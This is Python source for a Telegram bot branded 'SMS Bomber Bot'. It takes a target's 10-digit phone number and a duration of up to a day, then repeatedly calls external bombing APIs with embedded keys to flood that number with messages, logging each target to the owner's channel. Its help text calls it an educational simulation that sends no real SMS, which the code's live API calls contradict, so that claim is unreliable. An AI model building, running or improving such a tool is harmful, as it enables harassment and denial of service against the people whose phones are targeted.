import os
import asyncio
import json
import shutil
import sqlite3
import logging
import tempfile
from datetime import datetime, timedelta
from typing import Dict
import aiohttp

from telegram import Update
from telegram.ext import (
    Application, CommandHandler, ConversationHandler,
    MessageHandler, filters, ContextTypes
)

import database as db

# ========== LOGGING ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== CONFIGURATION ==========
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN")
OWNER_ID = int(os.environ.get("OWNER_ID", "8104850843"))
LOG_CHANNEL_ID = int(os.environ.get("LOG_CHANNEL_ID", "-10036720099488"))
FORCED_CHANNELS = json.loads(os.environ.get("FORCED_CHANNELS", "[]"))

# Fixed API URLs (keys embedded)
START_API = "https://bomber.kingcc.qzz.io/bomb?key=urfaaan_omdivine&numbar="
STOP_API = "https://bomber.kingcc.qzz.io/stop?key=urfaaan_omdivine&numbar="
SINGLE_API = "https://bomm.gauravcyber0.workers.dev/?phone="

INTERVAL_SECONDS = int(os.environ.get("INTERVAL_SECONDS", "30"))
MAX_DURATION_SECONDS = int(os.environ.get("MAX_DURATION_SECONDS", "86400"))
BRANDING = "\n\n⚡ Powered by NULL PROTOCOL"

# Conversation states
PHONE, DURATION = range(2)

# Active bombing sessions
active_bombs: Dict[int, asyncio.Task] = {}

# ========== HELPER FUNCTIONS ==========
def format_json_human(data):
    if not data:
        return "No data"
    if "error" in data:
        return f"❌ Error: {data['error']}"
    text = ""
    if "message" in data:
        text += f"📢 {data['message']}\n"
    if "status" in data:
        text += f"Status: {data['status']}\n"
    if "total_apis" in data:
        text += f"📊 Total APIs: {data['total_apis']}\n"
    if "success" in data:
        text += f"✅ Success: {data['success']}\n"
    if "failed" in data:
        text += f"❌ Failed: {data['failed']}\n"
    if "results" in data:
        text += "\n📡 Results:\n"
        for r in data["results"]:
            name = r.get("name", "Unknown")
            success = r.get("success", False)
            status = "✅" if success else "❌"
            text += f"{status} {name}"
            if "time" in r:
                text += f" ({r['time']})"
            text += "\n"
    if "final_stats" in data:
        stats = data["final_stats"]
        text += f"\n📊 Final Stats:\n"
        text += f"  Total requests: {stats.get('total_requests',0)}\n"
        text += f"  Success: {stats.get('success',0)}\n"
        text += f"  Failed: {stats.get('failed',0)}\n"
    return text.strip() or "No data"

async def call_start_api(phone):
    async with aiohttp.ClientSession() as session:
        url = f"{START_API}{phone}"
        try:
            async with session.get(url, timeout=10) as resp:
                return await resp.json()
        except Exception as e:
            logger.exception("start_api error")
            return {"error": str(e)}

async def call_single_api(phone):
    async with aiohttp.ClientSession() as session:
        url = f"{SINGLE_API}{phone}"
        try:
            async with session.get(url, timeout=10) as resp:
                return await resp.json()
        except Exception as e:
            logger.exception("single_api error")
            return {"error": str(e)}

async def call_stop_api(phone):
    async with aiohttp.ClientSession() as session:
        url = f"{STOP_API}{phone}"
        try:
            async with session.get(url, timeout=10) as resp:
                return await resp.json()
        except Exception as e:
            logger.exception("stop_api error")
            return {"error": str(e)}

async def check_force_join(user_id, context):
    if not FORCED_CHANNELS:
        return True
    for channel in FORCED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(channel["id"], user_id)
            if member.status in ["left", "kicked"]:
                return False
        except Exception:
            return False
    return True

async def send_force_join_message(update):
    msg = "⚠️ *You must join the following channels to use this bot:*\n\n"
    for ch in FORCED_CHANNELS:
        msg += f"- {ch['name']}: {ch['link']}\n"
    msg += "\nAfter joining, use /start again."
    await update.message.reply_text(msg, parse_mode="Markdown")

# ========== COMMANDS ==========
async def start(update, context):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    if db.is_banned(user.id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return
    if not db.is_admin(user.id, OWNER_ID) and not await check_force_join(user.id, context):
        await send_force_join_message(update)
        return
    text = (
        "🔫 *SMS Bomber Bot*\n"
        "Commands:\n"
        "/bomber - Start bombing\n"
        "/stop - Stop active bombing\n"
        "/info - About this bot\n"
        "/help - How to use\n"
    )
    if db.is_admin(user.id, OWNER_ID):
        text += "\n*Admin:*\n/ban <id>\n/unban <id>\n/broadcast <msg>"
    text += BRANDING
    await update.message.reply_text(text, parse_mode="Markdown")

async def info(update, context):
    await update.message.reply_text(
        "🔥 *SMS Bomber (Simulation)*\n"
        "Educational purpose only. No real SMS sent.\n"
        "Use /bomber to start." + BRANDING,
        parse_mode="Markdown"
    )

async def help_command(update, context):
    await update.message.reply_text(
        "📖 *How to use*\n"
        "1. /bomber\n"
        "2. Enter 10-digit phone number\n"
        "3. Enter duration in seconds\n"
        "4. Bot sends simulated updates every 30 seconds\n"
        "5. /stop to cancel" + BRANDING,
        parse_mode="Markdown"
    )

# ========== BOMBER CONVERSATION ==========
async def bomber_start(update, context):
    user_id = update.effective_user.id
    if db.is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    if user_id in active_bombs:
        await update.message.reply_text("⚠️ Active bombing session running. Use /stop first.")
        return
    await update.message.reply_text("📞 Send *10-digit phone number*:\n/cancel to abort", parse_mode="Markdown")
    return PHONE

async def get_phone(update, context):
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Enter exactly 10 digits.")
        return PHONE
    context.user_data["phone"] = phone
    await update.message.reply_text(f"⏱️ Duration in seconds (max {MAX_DURATION_SECONDS}):\nExample: 60 for 1 minute\n/cancel to abort")
    return DURATION

async def get_duration(update, context):
    try:
        seconds = int(update.message.text.strip())
        if seconds <= 0 or seconds > MAX_DURATION_SECONDS:
            raise ValueError
    except ValueError:
        await update.message.reply_text(f"❌ Invalid. Enter number between 1 and {MAX_DURATION_SECONDS}.")
        return DURATION
    context.user_data["duration"] = seconds
    await start_bombing(update, context)
    return ConversationHandler.END

async def start_bombing(update, context):
    user_id = update.effective_user.id
    phone = context.user_data["phone"]
    duration = context.user_data["duration"]
    if LOG_CHANNEL_ID:
        try:
            await context.bot.send_message(
                LOG_CHANNEL_ID,
                f"🔔 New bombing\nUser: {user_id}\nTarget: +91{phone}\nDuration: {duration}s"
            )
        except:
            pass
    result = await call_start_api(phone)
    text = f"🔥 *Bombing Started!*\n\n{format_json_human(result)}\n\nDuration: {duration}s\nUse /stop to cancel." + BRANDING
    await update.message.reply_text(text, parse_mode="Markdown")
    task = asyncio.create_task(bombing_loop(user_id, phone, duration, context))
    active_bombs[user_id] = task

async def bombing_loop(user_id, phone, duration, context):
    end_time = datetime.now() + timedelta(seconds=duration)
    iteration = 0
    try:
        while datetime.now() < end_time:
            iteration += 1
            await asyncio.sleep(INTERVAL_SECONDS)
            if datetime.now() >= end_time:
                break
            result = await call_single_api(phone)
            await context.bot.send_message(user_id, f"📡 *Cycle #{iteration}*\n\n{format_json_human(result)}" + BRANDING, parse_mode="Markdown")
        stop_result = await call_stop_api(phone)
        await context.bot.send_message(user_id, f"🛑 *Bombing Stopped (duration ended)*\n\n{format_json_human(stop_result)}" + BRANDING, parse_mode="Markdown")
    except asyncio.CancelledError:
        stop_result = await call_stop_api(phone)
        await context.bot.send_message(user_id, f"🛑 *Bombing Stopped by user*\n\n{format_json_human(stop_result)}" + BRANDING, parse_mode="Markdown")
    except Exception as e:
        logger.exception("Bombing loop error")
        await context.bot.send_message(user_id, f"❌ Error: {e}")
    finally:
        if user_id in active_bombs:
            del active_bombs[user_id]

async def stop(update, context):
    user_id = update.effective_user.id
    if user_id in active_bombs:
        active_bombs[user_id].cancel()
        await update.message.reply_text("🛑 Stopping bombing...")
    else:
        await update.message.reply_text("No active bombing session.")

# ========== ADMIN COMMANDS ==========
async def ban(update, context):
    if not db.is_admin(update.effective_user.id, OWNER_ID):
        await update.message.reply_text("Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    try:
        target = int(context.args[0])
        db.ban_user(target)
        await update.message.reply_text(f"Banned {target}.")
    except:
        await update.message.reply_text("Invalid ID.")

async def unban(update, context):
    if not db.is_admin(update.effective_user.id, OWNER_ID):
        await update.message.reply_text("Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    try:
        target = int(context.args[0])
        db.unban_user(target)
        await update.message.reply_text(f"Unbanned {target}.")
    except:
        await update.message.reply_text("Invalid ID.")

async def broadcast(update, context):
    if not db.is_admin(update.effective_user.id, OWNER_ID):
        await update.message.reply_text("Unauthorized.")
        return
    if update.message.reply_to_message:
        msg = update.message.reply_to_message
        text = None
    else:
        if not context.args:
            await update.message.reply_text("Usage: /broadcast <message> or reply to a message.")
            return
        text = " ".join(context.args)
        msg = None
    users = db.get_all_users()
    sent = 0
    for uid in users:
        try:
            if msg:
                await msg.copy(uid)
            else:
                await context.bot.send_message(uid, text)
            sent += 1
            await asyncio.sleep(0.2)
        except:
            pass
    await update.message.reply_text(f"Broadcast sent to {sent}/{len(users)} users.")

# ========== MAIN ==========
def main():
    db.init_db()
    app = Application.builder().token(TOKEN).build()

    bomber_conv = ConversationHandler(
        entry_points=[CommandHandler("bomber", bomber_start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_duration)],
        },
        fallbacks=[CommandHandler("cancel", lambda u,c: u.message.reply_text("Cancelled."))],
        per_message=False
    )
    app.add_handler(bomber_conv)

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("help", help_command))

    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("broadcast", broadcast))

    logger.info("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
